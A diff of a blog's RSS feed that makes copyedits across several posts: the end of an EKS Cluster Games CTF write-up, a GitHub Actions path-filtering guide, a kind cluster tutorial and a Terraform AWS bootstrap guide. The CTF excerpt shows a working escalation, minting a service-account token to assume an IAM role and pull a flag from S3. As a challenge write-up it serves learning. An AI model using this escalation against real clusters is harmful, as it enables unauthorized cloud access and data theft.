 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kubectl</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> sa</span><span style="color:#96D0FF"> s3access-sa</span><span style="color:#6CB6FF"> -o</span><span style="color:#96D0FF"> json</span></span>
 <span data-line=""><span style="color:#ADBAC7">{</span></span>
@@ -468,18 +468,18 @@ look at that service account we want to become:</p>
 <span data-line=""><span style="color:#F69D50">        "uid"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "86e44c49-b05a-4ebe-800b-45183a6ebbda"</span></span>
 <span data-line=""><span style="color:#ADBAC7">    }</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
-<p>I think we are going to need to use our AWS access to assume that role, I don't
+<p>I think we are going to need to use our AWS access to assume that role, I do not
 believe our kubernetes access is going to get us anywhere:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> sts</span><span style="color:#96D0FF"> assume-role</span><span style="color:#6CB6FF"> --role-arn</span><span style="color:#96D0FF"> arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color:#6CB6FF"> --role-session-name</span><span style="color:#96D0FF"> test</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">An</span><span style="color:#96D0FF"> error</span><span style="color:#96D0FF"> occurred</span><span style="color:#ADBAC7"> (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role</span></span></code></pre></figure>
-<p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role
-directly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>
+<p>Ok, so <em>maybe</em> our kubernetes access is important since we cannot assume the role
+directly.   Let us try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> sts</span><span style="color:#96D0FF"> assume-role-with-web-identity</span><span style="color:#6CB6FF"> --role-arn</span><span style="color:#96D0FF"> arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color:#6CB6FF"> --role-session-name</span><span style="color:#96D0FF"> test</span><span style="color:#6CB6FF"> --web-identity-token</span><span style="color:#ADBAC7"> $TOKEN</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">An</span><span style="color:#96D0FF"> error</span><span style="color:#96D0FF"> occurred</span><span style="color:#ADBAC7"> (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience</span></span></code></pre></figure>
 <p>Getting closer!   The default audience for a token created with <code>kubectl</code> is
-<code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try
+<code>https://kubernetes.default.svc</code> which amazon does not seem to like.  Let us try
 creating it again with <code>sts.amazonaws.com</code>:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> TOKEN=</span><span style="color:#ADBAC7">$(</span><span style="color:#F69D50">kubectl</span><span style="color:#96D0FF"> create</span><span style="color:#96D0FF"> token</span><span style="color:#96D0FF"> debug-sa</span><span style="color:#6CB6FF"> --audience</span><span style="color:#96D0FF"> sts.amazonaws.com</span><span style="color:#ADBAC7">)</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> sts</span><span style="color:#96D0FF"> assume-role-with-web-identity</span><span style="color:#6CB6FF"> --role-arn</span><span style="color:#96D0FF"> arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color:#6CB6FF"> --role-session-name</span><span style="color:#96D0FF"> test</span><span style="color:#6CB6FF"> --web-identity-token</span><span style="color:#ADBAC7"> $TOKEN</span></span>
@@ -498,7 +498,7 @@ creating it again with <code>sts.amazonaws.com</code>:</p>
 <span data-line=""><span style="color:#F69D50">    "Provider"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",</span></span>
 <span data-line=""><span style="color:#F69D50">    "Audience"</span><span style="color:#6CB6FF">:</span><span style="color:#96D0FF"> "sts.amazonaws.com"</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
-<p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>
+<p>Success!  We have some new AWS credentials.  Let us setup our new AWS Session:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> AWS_ACCESS_KEY_ID="ASIA2AVYNEV&#x3C;*REDACTED*>"</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> AWS_SECRET_ACCESS_KEY="VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> export</span><span style="color:#96D0FF"> AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span></span>
@@ -535,8 +535,8 @@ providing us the IAM policy:</p>
 <span data-line=""><span style="color:#F69D50">download:</span><span style="color:#96D0FF"> s3://challenge-flag-bucket-3ff1ae2/flag</span><span style="color:#96D0FF"> to</span><span style="color:#96D0FF"> ./flag</span><span style="color:#ADBAC7">       </span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> cat</span><span style="color:#96D0FF"> flag</span></span>
 <span data-line=""><span style="color:#F69D50">wiz_eks_challenge</span><span style="color:#96D0FF">{w0w_y0u_really_are_4n_eks_and_aws</span><span style="color:#ADBAC7">&#x3C;*REDACTED*>}</span></span></code></pre></figure>
-<p>and thats the final flag! In my next post I'll discuss the remediation steps
-to prevent this configuration mistakes on your cluster!</p>]]></description>
+<p>and that is the final flag! In my next post I will discuss the remediation steps
+to prevent these configuration mistakes on your cluster!</p>]]></description>
             <link>https://sontek.net/blog/2023/eks_cluster_games_ctf</link>
             <guid isPermaLink="true">https://sontek.net/blog/2023/eks_cluster_games_ctf</guid>
             <pubDate>Thu, 02 Nov 2023 00:00:00 GMT</pubDate>
@@ -545,7 +545,7 @@ to prevent this configuration mistakes on your cluster!</p>]]></description>
             <title><![CDATA[Speed up github actions with conditional jobs, even with required checks]]></title>
             <description><![CDATA[<p>Having every github action run on every pull request will end up slowing you
 down and sometimes even discourage you from making changes.  For example, if you
-see an error in the <code>README.md</code> but you know you'll have to wait for the entire
+see an error in the <code>README.md</code> but you know you will have to wait for the entire
 test suite to run you may choose not to push the change.</p>
 <h1>Path Filtering</h1>
 <p>To address this problem, Github has a feature called <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore">path filtering</a>
@@ -565,7 +565,7 @@ even a simpler format to this by using <code>paths-ignore</code>:</p>
 <span data-line=""><span style="color:#ADBAC7">      - </span><span style="color:#96D0FF">'README.md'</span></span>
 <span data-line=""><span style="color:#ADBAC7">      - </span><span style="color:#96D0FF">'.gitignore'</span></span></code></pre></figure>
 <p>Although the path filtering feature of github works, I do not recommend using
-it because it has some critical issues that I'll talk about below!</p>
+it because it has some critical issues that I will talk about below!</p>
 <h1>Branch Protection / Required Checks</h1>
 <p>Path Filtering has one major flaw which is that it skips the run of the job
 completely which means if you are using <a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches">branch protection</a>
@@ -599,7 +599,7 @@ about:</p>
 files like <code>tests</code>, <code>docs</code>, etc. and conditionally do things if each of them
 changed.</p>
 <p>So from our example, this step will generate output we can use <code>steps.changed-files-yaml.outputs.src_any_changed</code>
-that is either <code>true</code> or <code>false.</code>. To use this we can us the <code>if</code> conditional
+that is either <code>true</code> or <code>false</code>. To use this we can use the <code>if</code> conditional
 block on our jobs.</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="yaml" data-theme="github-dark-dimmed"><code data-language="yaml" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#8DDB8C">steps</span><span style="color:#ADBAC7">:</span></span>
 <span data-line=""><span style="color:#ADBAC7">    - </span><span style="color:#8DDB8C">if</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">steps.changed-files-yaml.outputs.src_any_changed == 'true'</span></span>
@@ -607,14 +607,14 @@ block on our jobs.</p>
 <span data-line=""><span style="color:#96D0FF">        earthly \</span></span>
 <span data-line=""><span style="color:#96D0FF">        +ci-terraform-lint \</span></span>
 <span data-line=""><span style="color:#96D0FF">            --TERRAFORM_VERSION=${{ env.RTX_TERRAFORM_VERSION }}</span></span></code></pre></figure>
-<p>This will then skip linting if we didn't change any terraform and the job will
+<p>This will then skip linting if we did not change any terraform and the job will
 be marked successful!</p>
 <center>
 <img src="/images/posts/github_skip_required_checks/skipped_checks.png">
 </center>
 <p>This can be confusing sometimes and the people you work with (or future you!)
 may wonder why these critical checks are being skipped.   I like to include
-a message with the decision that was made so its obvious that we wanted to skip
+a message with the decision that was made so it is obvious that we wanted to skip
 them:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="yaml" data-theme="github-dark-dimmed"><code data-language="yaml" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#ADBAC7">- </span><span style="color:#8DDB8C">if</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">steps.changed-files-yaml.outputs.src_any_changed == 'false'</span></span>
 <span data-line=""><span style="color:#8DDB8C">  run</span><span style="color:#ADBAC7">: </span><span style="color:#F47067">|</span></span>
@@ -663,12 +663,12 @@ developer experience enjoyable!</p>]]></description>
             <title><![CDATA[Running a kubernetes cluster locally with kind]]></title>
             <description><![CDATA[<p>Previously I <a href="/blog/2022/local_kubeadm_cluster">showed</a> how to run kubernetes
 locally with <code>kubeadm</code> and VMs but sometimes that is overkill so I wanted to
-show how to run <a href="https://kind.sigs.k8s.io/">kind</a> which is "kuberetes in
+show how to run <a href="https://kind.sigs.k8s.io/">kind</a> which is "kubernetes in
 docker".</p>
 <h1>Creating your first cluster</h1>
 <p>kind is a very flexible way to run kubernetes locally and allows you to run
-single node or multinode clusters while having the flexibility to use all
-the features of kubernetes success as ingress.</p>
+single node or multinode clusters with access to all the features of
+kubernetes, such as ingress.</p>
 <p>To create your first cluster it is as simple as running:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kind</span><span style="color:#96D0FF"> create</span><span style="color:#96D0FF"> cluster</span><span style="color:#ADBAC7">  </span></span>
 <span data-line=""> </span>
@@ -695,7 +695,7 @@ can view what it created:</p>
 <span data-line=""><span style="color:#F69D50">CONTAINER</span><span style="color:#96D0FF"> ID</span><span style="color:#96D0FF">   IMAGE</span><span style="color:#96D0FF">                  COMMAND</span><span style="color:#96D0FF">                  CREATED</span><span style="color:#96D0FF">         STATUS</span><span style="color:#96D0FF">         PORTS</span><span style="color:#96D0FF">                       NAMES</span></span>
 <span data-line=""><span style="color:#F69D50">1c3ba74dc29b</span><span style="color:#96D0FF">   kindest/node:v1.27.3</span><span style="color:#96D0FF">   "/usr/local/bin/entr…"</span><span style="color:#6CB6FF">   3</span><span style="color:#96D0FF"> minutes</span><span style="color:#96D0FF"> ago</span><span style="color:#96D0FF">   Up</span><span style="color:#6CB6FF"> 3</span><span style="color:#96D0FF"> minutes</span><span style="color:#96D0FF">   127.0.0.1:59327</span><span style="color:#ADBAC7">-</span><span style="color:#F47067">></span><span style="color:#96D0FF">6443/tcp</span><span style="color:#96D0FF">   kind-control-plane</span></span></code></pre></figure>
 <h1>Making the cluster useful</h1>
-<p>There are a few things you'll notice with the command we ran originally:</p>
+<p>There are a few things you will notice with the command we ran originally:</p>
 <ul>
 <li>It grabbed the latest kubernetes version available</li>
 <li>It is running a single node cluster</li>
@@ -724,12 +724,12 @@ you want it to be by using a <code>YAML</code> configuration.</p>
 <span data-line=""><span style="color:#ADBAC7">- </span><span style="color:#8DDB8C">role</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">worker</span></span>
 <span data-line=""><span style="color:#ADBAC7">- </span><span style="color:#8DDB8C">role</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">worker</span></span>
 <span data-line=""><span style="color:#ADBAC7">- </span><span style="color:#8DDB8C">role</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">worker</span></span></code></pre></figure>
-<p>With this we've now generated a 4 node cluster where we have a single
+<p>With this we have now generated a 4 node cluster where we have a single
 control-plane and three workers.  Then we defined some extra configuration on
 the control-plane:</p>
 <ul>
 <li><strong>kubeadmConfigPatches</strong>: We want to change the default configuration the
-cluster uses so it'll tag the nodes with the <code>ingress-ready</code> label so the
+cluster uses so it will tag the nodes with the <code>ingress-ready</code> label so the
 controller will use them.</li>
 <li><strong>extraPortMappings</strong>: allow the local host to make requests to the Ingress controller over ports 80/443</li>
 <li><strong>node-labels</strong>: only allow the ingress controller to run on specific node(s) matching the label selector</li>
@@ -737,10 +737,10 @@ controller will use them.</li>
 <p>So now we can create the new cluster with the configuration. Save that config
 as <code>kind_config.yml</code> and then run:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kind</span><span style="color:#96D0FF"> create</span><span style="color:#96D0FF"> cluster</span><span style="color:#6CB6FF"> --image</span><span style="color:#96D0FF"> kindest/node:v1.25.11</span><span style="color:#6CB6FF"> --config</span><span style="color:#96D0FF"> kind_config.yml</span><span style="color:#6CB6FF"> --name</span><span style="color:#96D0FF"> kind-multinode</span></span></code></pre></figure>
-<p>This time I've added a few additional flags on the commandline. <code>--image</code>
+<p>This time I have added a few additional flags on the commandline. <code>--image</code>
 allows us to use a different version of kubernetes and <code>--name</code> allows us to
-make more than one cluster. So if you didn't destroy the first cluster you'll
-see we have two of them now:</p>
+make more than one cluster. So if you did not destroy the first cluster you
+will see we have two of them now:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> kind</span><span style="color:#96D0FF"> get</span><span style="color:#96D0FF"> clusters</span></span>
 <span data-line=""><span style="color:#F69D50">kind</span></span>
 <span data-line=""><span style="color:#F69D50">kind-multinode</span></span></code></pre></figure>
@@ -784,7 +784,7 @@ by running:</p>
 <span data-line=""><span style="color:#F69D50">NAME</span><span style="color:#96D0FF">                                       COMPLETIONS</span><span style="color:#96D0FF">   DURATION</span><span style="color:#96D0FF">   AGE</span></span>
 <span data-line=""><span style="color:#F69D50">job.batch/ingress-nginx-admission-create</span><span style="color:#96D0FF">   1/1</span><span style="color:#96D0FF">           22s</span><span style="color:#96D0FF">        68s</span></span>
 <span data-line=""><span style="color:#F69D50">job.batch/ingress-nginx-admission-patch</span><span style="color:#96D0FF">    1/1</span><span style="color:#96D0FF">           35s</span><span style="color:#96D0FF">        68s</span></span></code></pre></figure>
-<p>Once <code>ingress-nginx-controller</code> is in <code>Running</code> state you are read to go!</p>
+<p>Once <code>ingress-nginx-controller</code> is in <code>Running</code> state you are ready to go!</p>
 <h1>Deploying your first app</h1>
 <p>To prove that the cluster is working correctly we will deploy
 <a href="https://github.com/Kong/httpbin">httpbin</a> which is a nice little API server
@@ -880,7 +880,7 @@ resource, the <code>Ingress</code>:</p>
 <span data-line=""><span style="color:#8DDB8C">            port</span><span style="color:#ADBAC7">:</span></span>
 <span data-line=""><span style="color:#8DDB8C">              number</span><span style="color:#ADBAC7">: </span><span style="color:#6CB6FF">8000</span></span></code></pre></figure>
 <p>There are a few critical options here.  The first is the annotation to rewrite
-the path so it doesn't include <code>/httpbin/</code> when it sends the request to the
+the path so it does not include <code>/httpbin/</code> when it sends the request to the
 service and then the <code>path</code> and <code>pathType</code> so it knows which paths to send to
 which service.</p>
 <p>Now you should be able to hit your local host and get routed to your
@@ -899,7 +899,7 @@ inside the cluster.</p>]]></description>
         <item>
             <title><![CDATA[AWS From Scratch with Terraform - Setting up your Root Account for IaC  with Terraform Cloud and Github actions.]]></title>
             <description><![CDATA[<p>Following this article will get you setup with an AWS Root account that can be
-managed through through Terraform Cloud with OIDC and github actions. As a best practice you
+managed through Terraform Cloud with OIDC and github actions. As a best practice you
 should not keep long-lived access keys in your CI/CD pipelines when
 deploying to AWS, instead you should use OIDC (OpenID Connect) to securely
 deploy to AWS when using Terraform Cloud or Github Actions.</p>
@@ -935,7 +935,7 @@ of the job.</li>
 </ol>
 <h1>What does this post accomplish</h1>
 <ul>
-<li>Setup a root AWS account that is managed througuh terraform</li>
+<li>Setup a root AWS account that is managed through terraform</li>
 <li>Setup OIDC authentication with Terraform Cloud so it can talk to AWS</li>
 <li>Setup Github Actions authentication with Terraform Cloud so we can run plan
 and apply through the CI/CD pipeline.</li>
@@ -954,7 +954,7 @@ right:</p>
 <img src="/images/posts/aws_root_account/create_access_token.png" width="200">
 </center>
 <p>You need to set these environment variables in your shell so that your local
-shell has access to AWS. After you set them you can verify you set them correct
+shell has access to AWS. After you set them you can verify you set them correctly
 by running:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> aws</span><span style="color:#96D0FF"> sts</span><span style="color:#96D0FF"> get-caller-identity</span></span></code></pre></figure>
 <p>and you should get a result similar to:</p>
@@ -964,15 +964,15 @@ by running:</p>
 <span data-line=""><span style="color:#8DDB8C">    "Arn"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"arn:aws:iam::888888888888:root"</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
 <h2>Bootstrap</h2>
-<p>Before you can manage any of your accounts through Terraform Cloud you'll need
+<p>Before you can manage any of your accounts through Terraform Cloud you will need to
 bootstrap some core infrastructure like OIDC so Terraform Cloud can authenticate
 securely and manage AWS Resources on your behalf.</p>
 <p>I personally prefer doing this in two repositories:</p>
 <ul>
 <li>
 <p><code>infra-bootstrap</code>: This repository does the bare minimum to hook up terraform
-cloud with your AWS account and stores the state in git.  Its the only infra
-that will not be controlled by your CI/CD pipeline.ccccccug</p>
+cloud with your AWS account and stores the state in git.  It is the only infra
+that will not be controlled by your CI/CD pipeline.</p>
 </li>
 <li>
 <p><code>infra</code>: The actual repository where all the rest of your AWS resources are
@@ -981,11 +981,11 @@ CI/CD pipeline for approving changes.</p>
 <p><strong>Note</strong>: This repository will be generated with the terraform code.</p>
 </li>
 </ul>
-<p>After manually creating the git repository <code>infra-boostrap</code> in your Github
+<p>After manually creating the git repository <code>infra-bootstrap</code> in your Github
 account We will need 3 providers to bootstrap the account <code>aws</code>, <code>github</code>, and
 <code>tfe</code>.</p>
 <h3>Variables</h3>
-<p>Create a <code>1-variables.tf</code> where we can define the variables we'll need
+<p>Create a <code>1-variables.tf</code> where we can define the variables we will need
 for creating these resources.</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="hcl" data-theme="github-dark-dimmed"><code data-language="hcl" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">variable</span><span style="color:#6CB6FF"> "tfc_aws_audience"</span><span style="color:#ADBAC7"> {</span></span>
 <span data-line=""><span style="color:#ADBAC7">  type</span><span style="color:#F47067">        =</span><span style="color:#F47067"> string</span></span>
@@ -1026,7 +1026,7 @@ for creating these resources.</p>
 <span data-line=""><span style="color:#ADBAC7">}</span></span>
 <span data-line=""> </span>
 <span data-line=""><span style="color:#F69D50">variable</span><span style="color:#6CB6FF"> "github_repo_name"</span><span style="color:#ADBAC7"> {</span></span>
-<span data-line=""><span style="color:#ADBAC7">  description</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "The name of the git reppository we'll create for managing infra"</span></span>
+<span data-line=""><span style="color:#ADBAC7">  description</span><span style="color:#F47067"> =</span><span style="color:#96D0FF"> "The name of the git repository we'll create for managing infra"</span></span>
 <span data-line=""><span style="color:#ADBAC7">  type</span><span style="color:#F47067">        =</span><span style="color:#F47067"> string</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span>
 <span data-line=""> </span>
@@ -1041,7 +1041,7 @@ for creating these resources.</p>
 <span data-line=""><span style="color:#ADBAC7">  type</span><span style="color:#F47067">        =</span><span style="color:#F47067"> string</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
 <p>We will use these variables in the later modules but they are mostly metadata
-around the terraform and github accounts you'll need to setup manually.</p>
+around the terraform and github accounts you will need to setup manually.</p>
 <h3>Providers</h3>
 <p>Create a file called <code>2-providers.tf</code> and define the providers:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="hcl" data-theme="github-dark-dimmed"><code data-language="hcl" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">terraform</span><span style="color:#ADBAC7"> {</span></span>
@@ -1075,7 +1075,7 @@ around the terraform and github accounts you'll need to setup manually.</p>
 <span data-line=""><span style="color:#ADBAC7">  owner</span><span style="color:#F47067"> =</span><span style="color:#ADBAC7"> var</span><span style="color:#F47067">.</span><span style="color:#ADBAC7">github_organization</span></span>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
 <p>The key things there are we define <code>allowed_account_ids</code> to prevent us from
-working against any account that isn't the root and we are using one of the
+working against any account that is not the root and we are using one of the
 variables we defines earlier.</p>
 <h3>Github</h3>
 <p>We will utilize <code>terraform</code> to create the second git repository where the rest
@@ -1117,7 +1117,7 @@ personal access token with full <code>repo</code> access and set it as an enviro
 variable named <code>GITHUB_TOKEN</code>.</p>
 <h3>Terraform Cloud</h3>
 <p>Now we need to setup dynamic credentials so the terraform cloud agent is
-allowed to take actions on your behalf.   To do this we'll setup an IAM
+allowed to take actions on your behalf.   To do this we will setup an IAM
 role and an OIDC provider. Create a file called <code>4-tfc.tf</code>:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="hcl" data-theme="github-dark-dimmed"><code data-language="hcl" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">resource</span><span style="color:#6CB6FF"> "tfe_organization"</span><span style="color:#6CB6FF"> "organization"</span><span style="color:#ADBAC7"> {</span></span>
 <span data-line=""><span style="color:#ADBAC7">  name</span><span style="color:#F47067">  =</span><span style="color:#ADBAC7"> var</span><span style="color:#F47067">.</span><span style="color:#ADBAC7">tfc_organization_name</span></span>
@@ -1226,9 +1226,9 @@ role and an OIDC provider. Create a file called <code>4-tfc.tf</code>:</p>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
 <p>This module is dynamic because there is one piece that will require a
 manual oauth setup for github.  So the first pass will apply without it
-and then later on we'll create it and run the apply again.</p>
+and then later on we will create it and run the apply again.</p>
 <h2>Applying the changes</h2>
-<p>Now we just need to define our settings for the module and we'll get our
+<p>Now we just need to define our settings for the module and we will get our
 infrastructure applied.  Create a file called <code>settings.auto.tfvars</code> and
 populate it with the content for your account.  This is an example of what
 this should look like:</p>
@@ -1267,7 +1267,7 @@ this should look like:</p>
 <h1>Verify TFC can talk to AWS</h1>
 <p>To verify that TFC can communicate with AWS through the dynamic credentials,
 lets clone the <em>NEW</em> repository we just generated and make some dummy resources. After
-you've cloned the repository lets make a folder for the workspace <code>root</code> that we
+you have cloned the repository lets make a folder for the workspace <code>root</code> that we
 defined in bootstrap:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> mkdir</span><span style="color:#96D0FF"> root</span></span>
 <span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> cd</span><span style="color:#96D0FF"> root</span></span></code></pre></figure>
@@ -1307,7 +1307,7 @@ defined in bootstrap:</p>
 <span data-line=""><span style="color:#ADBAC7">}</span></span></code></pre></figure>
 <p><strong>NOTE</strong>: You should replace <code>organization</code>, <code>workspaces.name</code>, and
 <code>tags.Owner</code> to be your own values.</p>
-<p>Now create a small resource to prove everything is working, we'll use SQS for
+<p>Now create a small resource to prove everything is working, we will use SQS for
 this. Create a file called <code>2-sqs.tf</code>:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="hcl" data-theme="github-dark-dimmed"><code data-language="hcl" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">resource</span><span style="color:#6CB6FF"> "aws_sqs_queue"</span><span style="color:#6CB6FF"> "example-sqs"</span><span style="color:#ADBAC7"> {</span></span>
 <span data-line=""><span style="color:#ADBAC7">  name</span><span style="color:#F47067">                        =</span><span style="color:#96D0FF"> "example-sqs"</span></span>
@@ -1331,7 +1331,7 @@ resource to see it all working:</p>
 </code></pre>
 <p>So Terraform Cloud has full access to create AWS resources!   The final step
 is to get github running the plan/apply on pull requests. Commit these files
-to your repository and we'll remove them in a pull request. Create a
+to your repository and we will remove them in a pull request. Create a
 <code>.gitignore</code> file in the root:</p>
 <pre><code>.terraform*
 </code></pre>
@@ -1351,10 +1351,10 @@ to your repository and we'll remove them in a pull request. Create a
 <a href="https://www.runatlantis.io/">Atlantis</a>.</p>
 </li>
 </ul>
-<p>I don't like apply-after-merge.  There are a lot of ways where a <code>plan</code>
+<p>I do not like apply-after-merge.  There are a lot of ways where a <code>plan</code>
 can succeed but an <code>apply</code> will fail and you end up with broken configuration
 in <code>main</code>.</p>
-<p>So in this article I'll show you how to implement <strong>apply-before-merge</strong> with
+<p>So in this article I will show you how to implement <strong>apply-before-merge</strong> with
 github actions.</p>
 <p>All of these changes will be in the <code>infra</code> repository that was generated from
 <code>bootstrap</code>.  We are done with the bootstrap at this point.</p>
@@ -1367,7 +1367,7 @@ github actions.</p>
 <p>So create the folders:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="bash" data-theme="github-dark-dimmed"><code data-language="bash" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#F69D50">❯</span><span style="color:#96D0FF"> mkdir</span><span style="color:#6CB6FF"> -p</span><span style="color:#96D0FF"> .github/workflows</span></span></code></pre></figure>
 <h1>On Pull Request</h1>
-<p>The first flow we'll create is the <code>terraform plan</code> workflow which should be
+<p>The first flow we will create is the <code>terraform plan</code> workflow which should be
 ran whenever a pull request is opened. Create the file
 <code>.github/workflows/on-pull-request.yml</code> and put this content in it:</p>
 <figure data-rehype-pretty-code-figure=""><pre style="background-color:#22272e;color:#adbac7" tabindex="0" data-language="yml" data-theme="github-dark-dimmed"><code data-language="yml" data-theme="github-dark-dimmed" style="display: grid;"><span data-line=""><span style="color:#8DDB8C">name</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">pr_build</span></span>
@@ -1435,7 +1435,7 @@ ran whenever a pull request is opened. Create the file
 <p>This creates three jobs:</p>
 <ul>
 <li><strong>terraform_validate</strong>: This validates the terraform via <code>terraform validate</code>
-command to make sure that it is correct and doesn't have duplicate resources
+command to make sure that it is correct and does not have duplicate resources
 or anything like that.</li>
 <li><strong>terraform_fmt</strong>: This verifies that the terraform is well formatted by
 running the <code>terraform fmt</code> command.`</li>
@@ -1456,9 +1456,9 @@ shows the plan:</p>
 <img src="/images/posts/aws_apply_before_merge/github_checks.png" width="400">
 </center>
 <h1>Apply on Label</h1>
-<p>So now that the plan is working we need some way to <code>apply</code> the changes. I've
